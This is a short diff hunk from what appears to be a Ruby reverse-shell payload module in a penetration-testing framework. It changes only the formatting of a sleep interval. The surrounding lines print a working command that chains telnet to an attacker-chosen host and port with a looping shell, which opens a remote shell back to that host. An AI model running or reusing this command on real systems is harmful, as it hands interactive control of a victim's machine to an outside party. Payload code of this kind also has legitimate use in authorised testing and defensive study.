@@ -44,7 +44,7 @@ module Reverse
 	#
 	def command_string
 		cmd =
-			"(sleep #{(3600+rand(1024)).to_s}|" +
+			"(sleep #{3600+rand(1024)}|" +
 			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
 			"while : ; do sh && break; done 2>&1|" +
 			"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
